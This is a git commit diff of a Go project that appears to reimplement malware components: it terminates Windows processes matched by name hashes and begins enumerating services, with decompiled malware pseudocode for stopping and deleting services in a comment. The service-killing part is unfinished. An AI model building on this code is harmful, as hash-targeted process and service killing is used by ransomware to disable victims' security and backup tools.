3466617ec1b9e67d04e1aa693673e637ba382483
Chuong Dong <chuongdongnguyen1012@gmail.com>
2021-09-11 14:51:03 +0700

    Terminate service progress

--- main.go
+++ main.go
@@ -1,12 +1,17 @@
 package main
 
 import (
+	"fmt"
 	"math/rand"
 	"time"
 )
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
+	err := killTargetServices([]uint32{1, 23})
+	if err != nil {
+		fmt.Println(err.Error())
+	}
 }
 
 // Things to do:
--- terminator.go
+++ terminator.go
@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"strings"
 	"syscall"
 	"unsafe"
@@ -11,7 +12,7 @@ import (
 const TH32CS_SNAPPROCESS = 0x00000002
 
 // use with admin priviledge
-func killProcess(processes []WindowsProcess, processHashList []uint32) (err error) {
+func killTargetProcesses(processes []WindowsProcess, processHashList []uint32) (err error) {
 
 	hashMap := make(map[uint32]bool, len(processHashList))
 	for _, hash := range processHashList {
@@ -27,6 +28,9 @@ func killProcess(processes []WindowsProcess, processHashList []uint32) (err erro
 			if err != nil {
 				return err
 			}
+
+			defer windows.CloseHandle(procHandle)
+
 			err = windows.TerminateProcess(procHandle, 1)
 		}
 	}
@@ -91,3 +95,73 @@ func newWindowsProcess(e *windows.ProcessEntry32) WindowsProcess {
 		Exe:             syscall.UTF16ToString(e.ExeFile[:end]),
 	}
 }
+
+func killTargetServices(serviceHashList []uint32) (err error) {
+	hashMap := make(map[uint32]bool, len(serviceHashList))
+	for _, hash := range serviceHashList {
+		hashMap[hash] = true
+	}
+
+	scManagerHandle, err := windows.OpenSCManager(nil, nil, 4)
+	if err != nil {
+		return err
+	}
+	defer windows.CloseHandle(scManagerHandle)
+
+	var bufSizeNeeded uint32 = 0
+	var servicesReturned uint32 = 0
+	err = windows.EnumServicesStatusEx(scManagerHandle, 0, windows.SERVICE_WIN32, windows.SERVICE_STATE_ALL, nil, 0, &bufSizeNeeded, &servicesReturned, nil, nil)
+
+	if err != windows.ERROR_MORE_DATA {
+		return err
+	}
+
+	var serviceStatusBuffer = make([]byte, bufSizeNeeded)
+	err = windows.EnumServicesStatusEx(scManagerHandle, 0, windows.SERVICE_WIN32, windows.SERVICE_STATE_ALL, (*byte)(&(serviceStatusBuffer[0])), bufSizeNeeded, &bufSizeNeeded, &servicesReturned, nil, nil)
+
+	var services []windows.ENUM_SERVICE_STATUS_PROCESS = *(*[]windows.ENUM_SERVICE_STATUS_PROCESS)(unsafe.Pointer(&serviceStatusBuffer))
+	var i uint32 = 0
+	// wideCharBuffer := make([]byte, 2)
+	// var wideChar uint16
+	for ; i < servicesReturned; i++ {
+
+		start := unsafe.Pointer(services[i].DisplayName)
+		size := unsafe.Sizeof(uint16(0))
+		var wideChar uint16
+		name := []uint16{}
+		tempIndex := 0
+		for {
+			wideChar = *(*uint16)(unsafe.Pointer(start))
+			if wideChar == 0 {
+				break
+			}
+			name = append(name, wideChar)
+			tempIndex++
+			start = unsafe.Pointer(uintptr(start) + size*uintptr(tempIndex))
+		}
+		//fmt.Println("name: ", windows.UTF16ToString(name))
+		fmt.Println("proc id:", services[i].ServiceStatusProcess.ProcessId)
+	}
+
+	fmt.Println("bufSizeNeeded: ", bufSizeNeeded)
+	fmt.Println("servicesReturned: ", servicesReturned)
+	return nil
+}
+
+// v5 = 0;
+// SC_Manager_handle = mw_OpenSCManagerW(0, 0, 4);
+// if ( SC_Manager_handle )
+// {
+//   service_handle = mw_OpenServiceW(SC_Manager_handle, service_name, 65568);
+//   if ( service_handle )
+//   {
+// 	mw_memset(v2, 0, 28);
+// 	mw_ControlService(service_handle, SERVICE_CONTROL_STOP, v2);
+// 	mw_DeleteService(service_handle);
+// 	mw_CloseServiceHandle(service_handle);
+// 	v5 = 1;
+//   }
+// }
+// if ( SC_Manager_handle )
+//   mw_CloseServiceHandle(SC_Manager_handle);
+// return v5;
